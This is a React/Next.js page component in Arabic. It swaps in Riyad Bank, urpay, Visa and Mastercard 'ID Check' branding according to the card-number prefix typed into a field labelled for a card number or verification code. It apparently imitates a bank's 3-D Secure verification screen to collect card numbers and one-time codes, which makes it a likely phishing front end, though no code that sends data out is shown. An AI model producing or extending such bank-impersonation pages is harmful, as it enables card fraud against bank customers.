'use client';

import { useState } from 'react';

export default function VerifiedHeaderPage() {
  const [digits, setDigits] = useState('');
  
  // تنظيف المدخلات والتحقق من البداية (Prefix)
  const cleanDigits = digits.replace(/[^0-9]/g, '');
  const isUrpay = cleanDigits.startsWith('4909');
  const isRiyad = cleanDigits.startsWith('5297');
  
  const variant = isUrpay ? 'urpay' : isRiyad ? 'riyad' : 'standard';

  return (
    <main className="shell" dir="rtl">
      <style jsx>{`
        * { box-sizing: border-box; }
        .shell { min-height: 100vh; background: #f4f7fb; padding: 28px 16px; color: #183153; font-family: Arial, Tahoma, sans-serif; }
        .wrap { width: 100%; max-width: 760px; margin: 0 auto; }
        .header-bar { width: 100%; min-height: 76px; padding: 14px 24px; display: flex; direction: ltr; align-items: center; justify-content: space-between; gap: 16px; background: #fff; border: 1px solid #e5eaf1; border-radius: 12px; box-shadow: 0 5px 18px rgba(24,49,83,.06); }
        
        /* Urpay style */
        .visa-logo { color: #123d9b; font-family: Arial, Helvetica, sans-serif; font-size: 32px; line-height: 1; font-weight: 900; font-style: italic; letter-spacing: -1.5px; white-space: nowrap; }
        .urpay-brand { display: flex; align-items: center; gap: 10px; color: #123d9b; font-family: Arial, Helvetica, sans-serif; font-size: 24px; font-weight: 800; white-space: nowrap; }
        .urpay-symbol { width: 36px; height: 36px; display: block; flex: none; }

        /* Riyad Bank style */
        .riyad-layout { display: flex; align-items: center; justify-content: space-between; width: 100%; direction: ltr; gap: 12px; }
        .riyad-brand { display: flex; align-items: center; gap: 10px; direction: rtl; }
        .riyad-symbol { width: 34px; height: 34px; flex: none; }
        .riyad-copy { display: flex; flex-direction: column; gap: 2px; text-align: right; }
        .riyad-ar { font-family: Tahoma, Arial, sans-serif; font-size: 17px; line-height: 1.15; font-weight: 700; color: #334155; }
        .riyad-en { font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.1; font-weight: 700; color: #475569; }
        
        .mastercard-check { display: flex; align-items: center; gap: 10px; direction: ltr; }
        .mc-circles { display: flex; width: 38px; position: relative; height: 24px; align-items: center; }
        .mc-red { width: 22px; height: 22px; border-radius: 50%; background: #eb001b; position: absolute; left: 0; }
        .mc-yellow { width: 22px; height: 22px; border-radius: 50%; background: #f79e1b; position: absolute; left: 14px; opacity: 0.85; }
        .mc-divider { height: 24px; width: 1px; background: #cbd5e1; }
        .mc-text { font-family: Arial, Helvetica, sans-serif; font-size: 16px; font-weight: 600; color: #1e293b; letter-spacing: -0.3px; }

        .controls { display: flex; flex-direction: column; gap: 8px; width: 100%; max-width: 280px; margin: 26px auto 0; }
        .label { color: #334155; font-size: 13px; font-weight: 700; text-align: right; }
        .input { width: 100%; height: 44px; padding: 8px 12px; border: 1px solid #cbd5e1; border-radius: 8px; background: #fff; color: #183153; font-size: 18px; letter-spacing: 2px; text-align: center; outline: none; }
        .input:focus { border-color: #4385d8; box-shadow: 0 0 0 3px rgba(67,133,216,.13); }
      `}</style>

      <section className="wrap">
        <header className="header-bar">
          {variant === 'riyad' ? (
            <div className="riyad-layout">
              <div className="riyad-brand">
                <svg className="riyad-symbol" viewBox="0 0 100 100" aria-hidden="true">
                  <path d="M10 40 V80 H40 V60 H70 V40 Z" fill="#009688" />
                  <path d="M30 20 H90 V60 H60 V40 H30 Z" fill="#4a148c" />
                </svg>
                <span className="riyad-copy">
                  <span className="riyad-ar">بنك الرياض</span>
                  <span className="riyad-en">Riyad Bank</span>
                </span>
              </div>
              <div className="mastercard-check">
                <div className="mc-circles">
                  <div className="mc-red" />
                  <div className="mc-yellow" />
                </div>
                <div className="mc-divider" />
                <span className="mc-text">ID Check</span>
              </div>
            </div>
          ) : variant === 'urpay' ? (
            <>
              <div className="visa-logo">VISA</div>
              <div className="urpay-brand">
                <svg className="urpay-symbol" viewBox="0 0 100 100" fill="none" stroke="#123d9b" strokeWidth="10" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
                  <path d="M35 15 H65 V45 C65 65 35 65 35 45 V15 Z" fill="none" />
                  <path d="M25 35 C15 35 15 85 45 85 H75" />
                </svg>
                <span>urpay</span>
              </div>
            </>
          ) : (
            <>
              <div className="visa-logo">VISA</div>
              <div className="visa-logo" style={{ opacity: 0.2, fontSize: '20px' }}>SECURE</div>
            </>
          )}
        </header>

        <div className="controls">
          <label className="label" htmlFor="code-input">رقم البطاقة أو رمز التحقق</label>
          <input
            id="code-input"
            className="input"
            type="text"
            inputMode="numeric"
            autoComplete="off"
            placeholder="أدخل الرقم هنا"
            value={digits}
            onChange={(e) => setDigits(e.target.value)}
          />
        </div>
      </section>
    </main>
  );
}
